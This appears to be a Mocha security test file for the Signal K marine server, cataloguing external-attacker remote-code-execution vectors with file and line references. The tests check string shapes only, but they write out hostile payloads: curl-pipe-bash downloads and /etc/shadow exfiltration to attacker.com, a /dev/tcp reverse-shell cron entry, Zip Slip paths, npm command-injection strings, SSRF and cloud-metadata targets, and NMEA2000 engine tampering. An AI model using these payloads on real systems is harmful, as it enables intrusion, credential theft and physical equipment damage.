/**
 * External Attacker RCE & Remote Exploitation Tests
 *
 * Focus: Attack vectors accessible from external/remote attackers
 * targeting Remote Code Execution, arbitrary file operations,
 * and server takeover.
 *
 * Attack Model: External attacker with network access (no auth initially)
 */

const { describe, it, before, after } = require('mocha');
const { expect } = require('chai');

describe('External Attacker RCE & Remote Exploitation', function() {
  this.timeout(30000);

  // ==================== ZIP SLIP ATTACKS ====================

  describe('Zip Slip Path Traversal in Backup Restore', function() {

    it('should test zip file with path traversal entries', function() {
      /**
       * CRITICAL VULNERABILITY: Zip Slip
       * File: src/serverroutes.ts lines 1101, 1114
       *
       * Code:
       * const unzipStream = unzipper.Extract({ path: restoreFilePath })
       * zipStream.pipe(unzipStream)
       *
       * Attack: Craft zip with entries like:
       * - ../../../etc/cron.d/malicious
       * - ../../../root/.ssh/authorized_keys
       * - ../../signalk-server/node_modules/malicious/index.js
       *
       * The unzipper library may follow paths, writing outside restoreFilePath
       */
      const zipSlipPayloads = [
        {
          entry: '../../../etc/cron.d/malicious',
          content: '* * * * * root curl attacker.com/shell.sh | bash'
        },
        {
          entry: '../../../root/.ssh/authorized_keys',
          content: 'ssh-rsa AAAA... attacker@evil.com'
        },
        {
          entry: '../../../tmp/malicious.sh',
          content: '#!/bin/bash\ncurl attacker.com/exfil?data=$(cat /etc/shadow | base64)'
        },
        {
          entry: '..\\..\\..\\..\\windows\\system32\\tasks\\malicious',
          content: '<?xml version="1.0"?><Task>...</Task>'
        },
        {
          entry: '../node_modules/@signalk/server-admin-ui/public/malicious.js',
          content: 'document.write("<script src=http://attacker.com/steal.js></script>")'
        }
      ];

      zipSlipPayloads.forEach(payload => {
        expect(payload.entry).to.include('..');
      });
    });

    it('should test zip file with symlink entries for arbitrary read', function() {
      /**
       * Attack: Zip contains symlinks pointing to sensitive files
       * When extracted, symlinks are followed for reads
       */
      const symlinkPayloads = [
        { name: 'settings.json', target: '/etc/shadow' },
        { name: 'defaults.json', target: '/root/.ssh/id_rsa' },
        { name: 'security.json', target: '../security.json' }, // Circular
        { name: 'package.json', target: '/proc/self/environ' },
      ];

      symlinkPayloads.forEach(payload => {
        expect(payload.target).to.be.a('string');
      });
    });

    it('should test backup zip bomb (DoS)', function() {
      /**
       * Attack: Zip bomb causes disk exhaustion
       * A 42KB zip can expand to 4.5 petabytes
       */
      const zipBombCharacteristics = {
        compressedSize: '42KB',
        expandedSize: '4.5PB',
        compressionRatio: 100000000000,
        // Nested zip-of-zips is most effective
      };

      expect(zipBombCharacteristics.compressionRatio).to.be.above(1000);
    });

    it('should test ncp directory copy without symlink handling', function() {
      /**
       * File: src/serverroutes.ts lines 1034-1045
       *
       * Code: ncp(path.join(restoreFilePath, name), path.join(app.config.configPath, name), ...)
       *
       * ncp (node copy) may follow symlinks during copy operation
       */
      const ncpVulnerability = {
        source: '/tmp/restore/settings.json -> /etc/passwd',
        destination: '/signalk/config/settings.json',
        risk: 'Symlink followed, /etc/passwd content copied'
      };

      expect(ncpVulnerability.source).to.include('->');
    });
  });

  // ==================== COMMAND INJECTION ====================

  describe('Command Injection via Package Names', function() {

    it('should test npm install command injection on Windows', function() {
      /**
       * CRITICAL: Windows command injection
       * File: src/modules.ts lines 193, 201-203
       *
       * Vulnerable:
       * spawn('cmd', ['/c', `npm ${command} -g ${packageString} `], opts)
       * spawn('cmd', ['/c', `npm --save --ignore-scripts ${command} ${packageString}`], opts)
       *
       * The template literal allows shell metacharacter injection on Windows
       */
      const windowsCmdInjection = [
        'legit-package & calc.exe',
        'legit-package | net user attacker P@ss /add',
        'legit-package && powershell -e <base64_payload>',
        'legit-package; curl attacker.com/shell.ps1 | iex',
        'legit-package` whoami`',  // Backtick substitution
        'legit-package$(whoami)',   // May not work on cmd but try
      ];

      windowsCmdInjection.forEach(payload => {
        expect(payload).to.include('legit-package');
      });
    });

    it('should test signalk-server module global install escalation', function() {
      /**
       * File: src/modules.ts lines 191-196, 224-226
       *
       * isTheServerModule() check:
       * if (moduleName === config.name) uses sudo npm -g
       *
       * Attack: If config.name can be manipulated, or if package.json
       * is restored with attacker-controlled name...
       */
      const serverModuleAttack = {
        legitimateName: 'signalk-server',
        attackVector: 'Restore backup with modified package.json where name="signalk-server"',
        result: 'npm runs with sudo/global, bypasses --ignore-scripts'
      };

      expect(serverModuleAttack.attackVector).to.include('backup');
    });

    it('should test package version injection', function() {
      /**
       * File: src/modules.ts lines 183-184
       *
       * packageString = version ? `${name}@${version}` : name
       *
       * Version string is concatenated, could inject npm args
       */
      const versionInjection = [
        '1.0.0 --ignore-scripts=false',
        '1.0.0; curl attacker.com',
        '1.0.0 --registry http://evil.com',
        '$(whoami)',
      ];

      versionInjection.forEach(version => {
        expect(version).to.be.a('string');
      });
    });
  });

  // ==================== DYNAMIC REQUIRE/IMPORT ====================

  describe('Dynamic Require/Import Injection', function() {

    it('should test interfaces/index.js dynamic require', function() {
      /**
       * File: src/interfaces/index.js lines 1-8
       *
       * Code:
       * require('fs').readdirSync(__dirname + '/').forEach(function (file) {
       *   if (file.match(/.+\.js$/g) !== null && file !== 'index.js') {
       *     const name = file.replace('.js', '')
       *     exports[name] = require('./' + file)
       *   }
       * })
       *
       * Attack: If attacker can write a .js file to src/interfaces/,
       * it will be automatically loaded on startup
       */
      const dynamicRequireAttack = {
        targetDir: 'src/interfaces/',
        maliciousFile: 'malicious.js',
        content: `
          const { exec } = require('child_process');
          exec('curl attacker.com/shell.sh | bash');
          module.exports = { start: () => {} };
        `,
        trigger: 'Server restart'
      };

      expect(dynamicRequireAttack.targetDir).to.include('interfaces');
    });

    it('should test plugin directory traversal', function() {
      /**
       * File: src/interfaces/plugins.ts line 99
       *
       * Plugin config stored in: configPath/plugin-config-data/
       * Plugins are loaded from node_modules/
       *
       * Attack: Restore backup with malicious plugin config that points
       * to attacker-controlled module path
       */
      const pluginPathTraversal = [
        '../../../tmp/malicious-plugin',
        '../attacker-plugin',
        '..\\..\\..\\windows\\temp\\malicious',
      ];

      pluginPathTraversal.forEach(path => {
        expect(path).to.include('..');
      });
    });

    it('should test importOrRequire with attacker-controlled path', function() {
      /**
       * File: src/modules.ts lines 354-375
       *
       * async function importOrRequire(moduleDir: string)
       *
       * moduleDir comes from scanning node_modules directory
       * If attacker can write to node_modules, code is executed
       */
      const moduleInjection = {
        step1: 'Upload backup with malicious node_modules',
        step2: 'Restore selects node_modules',
        step3: 'importOrRequire loads attacker module',
        result: 'RCE on next plugin load'
      };

      expect(moduleInjection.step1).to.include('backup');
    });
  });

  // ==================== PLAYGROUND INPUT INJECTION ====================

  describe('Playground API Injection', function() {

    it('should test inputTest endpoint delta injection', function() {
      /**
       * File: src/interfaces/playground.js lines 104-220
       *
       * POST /skServer/inputTest accepts raw data and processes it
       *
       * With sendToServer=true, deltas are injected into the data model
       */
      const playgroundInjection = {
        endpoint: '/skServer/inputTest',
        body: {
          value: JSON.stringify([{
            context: 'vessels.self',
            updates: [{
              values: [{
                path: '__proto__.polluted',
                value: true
              }]
            }]
          }]),
          sendToServer: true
        },
        risk: 'Prototype pollution via delta injection'
      };

      expect(playgroundInjection.body.sendToServer).to.be.true;
    });

    it('should test N2K output injection', function() {
      /**
       * File: src/interfaces/playground.js lines 188-193
       *
       * With sendToN2K=true, messages sent to NMEA2000 bus
       * Could affect physical devices on boat network
       */
      const n2kInjection = {
        endpoint: '/skServer/inputTest',
        body: {
          value: JSON.stringify([{
            pgn: 127489,  // Engine parameters
            dst: 255,     // Broadcast
            prio: 2,
            fields: {
              'Engine Instance': 0,
              'Speed': 65535  // Invalid/dangerous value
            }
          }]),
          sendToN2K: true
        },
        risk: 'Physical equipment damage or dangerous operation'
      };

      expect(n2kInjection.body.sendToN2K).to.be.true;
    });

    it('should test PUT path injection via playground', function() {
      /**
       * File: src/interfaces/playground.js lines 131-175
       *
       * PUT messages processed with putPath/deletePath
       */
      const putInjection = {
        value: JSON.stringify([{
          context: 'vessels.self',
          put: {
            path: '__proto__.isAdmin',
            value: true
          }
        }]),
        sendToServer: true
      };

      expect(putInjection.value).to.include('__proto__');
    });
  });

  // ==================== NPM REGISTRY ATTACKS ====================

  describe('NPM Registry & Package Attacks', function() {

    it('should test typosquatting via npm search', function() {
      /**
       * File: src/modules.ts lines 267-291
       *
       * searchByKeyword fetches from registry.npmjs.org
       * Attacker publishes package with signalk keyword
       */
      const typosquatAttack = {
        legitimatePackage: 'signalk-server',
        typosquatOptions: [
          'signalk-server1',
          'signalk_server',
          'signa1k-server',
          'signalk-servrr',
        ],
        attackVector: 'Publish to npm with signalk-plugin keyword'
      };

      typosquatAttack.typosquatOptions.forEach(name => {
        expect(name).to.not.equal('signalk-server');
      });
    });

    it('should test npm registry MITM', function() {
      /**
       * Attack: MITM npm registry traffic to inject malicious packages
       *
       * registry.npmjs.org is HTTPS but:
       * - DNS spoofing could redirect
       * - Custom .npmrc could set insecure registry
       */
      const registryMitm = {
        normalUrl: 'https://registry.npmjs.org',
        attackVector: 'Restore backup with malicious .npmrc',
        maliciousNpmrc: 'registry=http://attacker.com/npm/',
        result: 'All npm installs fetch from attacker'
      };

      expect(registryMitm.maliciousNpmrc).to.include('http://');
    });

    it('should test package.json dependency injection', function() {
      /**
       * Restore backup with modified package.json containing:
       * - Malicious dependencies
       * - postinstall scripts
       */
      const packageJsonInjection = {
        maliciousPackage: {
          name: 'signalk-config',
          dependencies: {
            'malicious-package': '^1.0.0'
          },
          scripts: {
            postinstall: 'curl attacker.com/shell.sh | bash'
          }
        }
      };

      expect(packageJsonInjection.maliciousPackage.scripts).to.have.property('postinstall');
    });

    it('should test restoreModules execution', function() {
      /**
       * File: src/modules.ts lines 160-177
       *
       * restoreModules runs npm install in configPath
       * This executes any scripts in package.json
       */
      const restoreModulesRisk = {
        trigger: 'POST /signalk/v1/api/server/restore with package.json selected',
        action: 'npm install runs in configPath',
        // Note: --ignore-scripts only on individual module install, not restore
        risk: 'postinstall scripts execute'
      };

      expect(restoreModulesRisk.trigger).to.include('restore');
    });
  });

  // ==================== SSRF TO RCE ====================

  describe('SSRF to Internal Service Exploitation', function() {

    it('should test SSRF via provider configuration', function() {
      /**
       * TCP/UDP providers connect to user-specified hosts
       * SSRF can access internal services
       */
      const ssrfTargets = [
        { host: '127.0.0.1', port: 6379, service: 'Redis' },
        { host: '127.0.0.1', port: 27017, service: 'MongoDB' },
        { host: '127.0.0.1', port: 5432, service: 'PostgreSQL' },
        { host: '127.0.0.1', port: 9200, service: 'Elasticsearch' },
        { host: '169.254.169.254', port: 80, service: 'AWS Metadata' },
        { host: 'metadata.google.internal', port: 80, service: 'GCP Metadata' },
        { host: '127.0.0.1', port: 2375, service: 'Docker API (RCE!)' },
        { host: '127.0.0.1', port: 10250, service: 'Kubelet API (RCE!)' },
      ];

      ssrfTargets.forEach(target => {
        expect(target.port).to.be.a('number');
      });
    });

    it('should test Docker socket SSRF RCE', function() {
      /**
       * If SignalK runs in Docker with socket mounted,
       * SSRF to Docker API = RCE on host
       */
      const dockerRce = {
        ssrfTarget: 'http://127.0.0.1:2375/containers/create',
        method: 'POST',
        body: {
          Image: 'alpine',
          Cmd: ['/bin/sh', '-c', 'cat /etc/shadow > /shared/shadow'],
          Binds: ['/:/host']
        },
        result: 'Container with host filesystem access'
      };

      expect(dockerRce.body.Binds[0]).to.equal('/:/host');
    });

    it('should test cloud metadata service exploitation', function() {
      /**
       * Cloud metadata services expose credentials without auth
       */
      const cloudMetadata = {
        aws: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        gcp: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        azure: 'http://169.254.169.254/metadata/identity/oauth2/token',
        risk: 'Stolen cloud credentials allow further attacks'
      };

      expect(cloudMetadata.aws).to.include('169.254.169.254');
    });
  });

  // ==================== UDP BROADCAST ATTACKS ====================

  describe('UDP Broadcast/Multicast Exploitation', function() {

    it('should test discovery UDP injection from network', function() {
      /**
       * File: src/discovery.js lines 84-150
       *
       * UDP listener accepts JSON with IP/Port, uses directly
       */
      const udpInjection = {
        broadcast: true,
        port: 2052,  // GoFree discovery
        payload: JSON.stringify({
          IP: '169.254.169.254',  // AWS metadata
          Port: 80,
          // Server will connect to this as NMEA source
        })
      };

      expect(udpInjection.payload).to.include('169.254.169.254');
    });

    it('should test mDNS service injection', function() {
      /**
       * mDNS allows advertising fake services
       *
       * Attack: Advertise fake SignalK server with malicious URL
       */
      const mdnsInjection = {
        service: '_signalk-http._tcp',
        name: 'Fake-SignalK-Server',
        port: 3000,
        txtRecord: {
          swname: 'signalk-server',
          self: 'urn:mrn:signalk:uuid:fake'
        },
        risk: 'Clients connect to attacker server'
      };

      expect(mdnsInjection.service).to.include('signalk');
    });

    it('should test NMEA TCP injection from LAN', function() {
      /**
       * Port 10110 accepts NMEA without auth
       * Attacker on same network can inject sentences
       */
      const nmeaInjection = {
        port: 10110,
        sentences: [
          '$GPGGA,000000,0000.000,N,00000.000,E,0,00,0.0,0,M,0,M,,*66', // False GPS
          '$GPRMB,A,0.00,R,START,DEST,0000.000,N,00000.000,W,0.0,0.0,0.0,V*6F', // False nav
          'A'.repeat(10000), // Buffer overflow attempt
        ]
      };

      expect(nmeaInjection.port).to.equal(10110);
    });
  });

  // ==================== WEBSOCKET EXPLOITATION ====================

  describe('WebSocket Remote Exploitation', function() {

    it('should test WebSocket message size limit bypass', function() {
      /**
       * Large WebSocket messages could cause memory exhaustion
       */
      const wsDoS = {
        messageSize: 100 * 1024 * 1024, // 100MB
        messageType: 'delta',
        risk: 'Memory exhaustion, server crash'
      };

      expect(wsDoS.messageSize).to.be.above(1024 * 1024);
    });

    it('should test WebSocket subscription flooding', function() {
      /**
       * Many subscriptions could exhaust server resources
       */
      const subscriptionFlood = {
        subscriptionsPerConnection: 10000,
        connections: 100,
        totalSubscriptions: 1000000,
        risk: 'CPU/memory exhaustion'
      };

      expect(subscriptionFlood.totalSubscriptions).to.equal(1000000);
    });

    it('should test delta replay attack', function() {
      /**
       * Capture and replay deltas to spoof data
       * No sequence numbers or MACs on messages
       */
      const replayAttack = {
        step1: 'Capture legitimate delta',
        step2: 'Modify timestamp/values',
        step3: 'Replay to server',
        risk: 'Spoofed position, sensor data'
      };

      expect(replayAttack.step3).to.include('Replay');
    });
  });

  // ==================== AUTHENTICATION BYPASS ====================

  describe('Authentication Bypass for RCE', function() {

    it('should test admin endpoint access via TCP port', function() {
      /**
       * TCP port 8375 has NO authentication
       * Can it send PUT/POST requests?
       */
      const tcpAuthBypass = {
        port: 8375,
        messages: [
          { put: { path: 'electrical.switches.bank.0.state', value: 1 } },
          { delete: { path: 'navigation.position' } },
        ],
        risk: 'Control vessel systems without auth'
      };

      expect(tcpAuthBypass.port).to.equal(8375);
    });

    it('should test CORS bypass for admin actions', function() {
      /**
       * If CORS allows *, attacker page can make admin requests
       */
      const corsExploit = {
        attackerPage: 'http://evil.com/attack.html',
        targetEndpoint: 'http://boat.local:3000/signalk/v1/api/server/plugins/install',
        method: 'POST',
        body: { name: 'malicious-plugin' },
        risk: 'Browser-based attack installs malicious plugin'
      };

      expect(corsExploit.attackerPage).to.include('evil.com');
    });

    it('should test DNS rebinding attack chain', function() {
      /**
       * DNS rebinding allows external attacker to access internal SignalK
       *
       * Attack chain:
       * 1. Victim visits attacker.com (resolves to attacker IP)
       * 2. JavaScript makes requests to attacker.com
       * 3. DNS changes attacker.com to resolve to victim's SignalK
       * 4. Same-origin policy bypassed, full API access
       */
      const dnsRebinding = {
        domain: 'attacker.com',
        phase1Ip: '1.2.3.4',  // Attacker server
        phase2Ip: '192.168.1.100',  // Victim SignalK
        ttl: 0,  // Force re-resolution
        actions: [
          'Read all vessel data',
          'Install malicious plugin',
          'Restart server',
          'Modify security config'
        ]
      };

      expect(dnsRebinding.phase2Ip).to.include('192.168');
    });
  });

  // ==================== FILE WRITE TO RCE ====================

  describe('Arbitrary File Write to RCE', function() {

    it('should test security.json overwrite', function() {
      /**
       * security.json contains admin credentials
       * Overwriting it could:
       * - Add attacker as admin
       * - Disable security
       * - Modify ACLs
       */
      const securityOverwrite = {
        file: 'security.json',
        content: {
          users: [
            {
              username: 'attacker',
              password: '$2a$10$...', // bcrypt hash
              type: 'admin'
            }
          ],
          acls: [],
          allowNewUserRegistration: true
        }
      };

      expect(securityOverwrite.content.users[0].type).to.equal('admin');
    });

    it('should test settings.json plugin injection', function() {
      /**
       * settings.json enables/configures plugins
       * Could enable malicious plugin or misconfigure security
       */
      const settingsOverwrite = {
        file: 'settings.json',
        content: {
          security: {
            enabled: false  // Disable all security!
          },
          plugins: {
            'malicious-plugin': {
              enabled: true,
              configuration: { backdoor: true }
            }
          }
        }
      };

      expect(settingsOverwrite.content.security.enabled).to.be.false;
    });

    it('should test cron job injection via backup restore', function() {
      /**
       * If zip slip works, write to /etc/cron.d/ for persistence
       */
      const cronInjection = {
        zipEntry: '../../../etc/cron.d/signalk-backdoor',
        content: '* * * * * root bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
        result: 'Reverse shell every minute'
      };

      expect(cronInjection.zipEntry).to.include('cron.d');
    });

    it('should test SSH authorized_keys injection', function() {
      /**
       * Write attacker SSH key for persistent access
       */
      const sshInjection = {
        zipEntry: '../../../root/.ssh/authorized_keys',
        content: 'ssh-rsa AAAA... attacker@evil.com',
        result: 'SSH access to server as root'
      };

      expect(sshInjection.result).to.include('root');
    });
  });

  // ==================== SUMMARY ====================

  describe('External Attacker RCE Test Summary', function() {
    it('should document all RCE vectors tested', function() {
      const rceVectors = {
        'Zip Slip Attacks': [
          'Path traversal in zip entries',
          'Symlink-based arbitrary read',
          'Zip bomb DoS',
          'ncp symlink following'
        ],
        'Command Injection': [
          'Windows npm install injection',
          'Global install sudo escalation',
          'Package version injection'
        ],
        'Dynamic Code Loading': [
          'interfaces/index.js auto-require',
          'Plugin directory traversal',
          'importOrRequire path injection'
        ],
        'Playground Injection': [
          'Delta injection to data model',
          'N2K physical device control',
          'PUT path prototype pollution'
        ],
        'NPM Registry Attacks': [
          'Typosquatting',
          'Registry MITM via .npmrc',
          'package.json dependency injection',
          'restoreModules script execution'
        ],
        'SSRF to RCE': [
          'Docker socket access',
          'Cloud metadata credential theft',
          'Internal service exploitation'
        ],
        'Network Injection': [
          'UDP discovery SSRF',
          'mDNS service spoofing',
          'NMEA TCP injection'
        ],
        'WebSocket Exploitation': [
          'Message size DoS',
          'Subscription flooding',
          'Delta replay'
        ],
        'Auth Bypass for RCE': [
          'TCP port unauthenticated control',
          'CORS bypass for admin actions',
          'DNS rebinding attack chain'
        ],
        'File Write to RCE': [
          'security.json overwrite',
          'settings.json plugin injection',
          'Cron job persistence',
          'SSH key injection'
        ]
      };

      let totalVectors = 0;
      Object.values(rceVectors).forEach(vectors => {
        totalVectors += vectors.length;
      });

      console.log('\n  ========================================');
      console.log('  External Attacker RCE Test Summary');
      console.log('  ========================================');
      console.log(`  Total Categories: ${Object.keys(rceVectors).length}`);
      console.log(`  Total RCE Vectors: ${totalVectors}`);
      console.log('  ========================================\n');

      expect(Object.keys(rceVectors).length).to.equal(10);
      expect(totalVectors).to.equal(34);
    });
  });
});
